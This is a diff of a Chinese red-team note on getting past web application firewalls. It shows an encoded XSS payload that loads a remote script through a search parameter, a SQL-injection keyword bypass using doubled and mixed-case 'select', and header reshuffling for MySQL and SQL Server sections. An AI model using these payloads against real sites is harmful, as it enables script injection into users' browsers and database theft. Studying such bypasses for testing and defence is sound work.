@@ -58,7 +58,7 @@
 最直白的 payload 类似 `<script> alert('xss'); </script>`,但是你可以用 `<script src=来远程加载脚本,并绕过防护`
 
 ```
-`http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`
+`?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`
 ```
 
 **注释符绕过**
@@ -293,13 +293,21 @@ OpenResty 通过ngx.req.get_uri_args、ngx.req.get_post_args获取参数，只�
 
 urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种方式是使用 urlencode 的方式提交,第二种方式是使用 form-data 的方式提交.当我们在测试站点的时候,如果发现 POST 提交的数据被过滤掉了,此时可以考虑使用 form-data 的方式去提交.
 
-创建一个存在 sql 注入漏洞的页面,获取参数从 POST 上获取,首先以 urlencode 的方式提交,查看发现提交的请求被阻断了.其次以 form-data 的方式提交,发现爆出了数据库的版本.
-
 ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/8.png)
 
 ---
 
-## MYSQL
+## SQLinj
+
+### MYSQL
+
+**关键词被替换**
+
+双写或者大小写绕过
+```
+seselectlect
+SElect
+```
 
 **参数和 union 之间的位置**
 - `\Nunion` 的形式
@@ -467,7 +475,7 @@ urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种�
 
 ---
 
-## sqlserver
+### sqlserver
 
 **select from 后的位置**
 - 空白符号
